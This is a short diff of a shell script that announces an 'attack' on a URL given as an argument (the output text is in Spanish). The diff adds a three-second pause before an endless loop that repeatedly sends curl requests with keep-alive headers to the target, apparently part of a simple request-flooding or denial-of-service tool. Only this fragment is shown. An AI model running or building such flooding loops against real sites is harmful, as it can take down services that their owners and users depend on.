@@ -31,6 +31,7 @@ echo "================================================="
 echo "Ataque sobre la url.: $1"
 echo "================================================="
 echo
+sleep 3
 while : ; do
       curl -v -I -k $1 \
 -H 'Connection: keep-alive' \
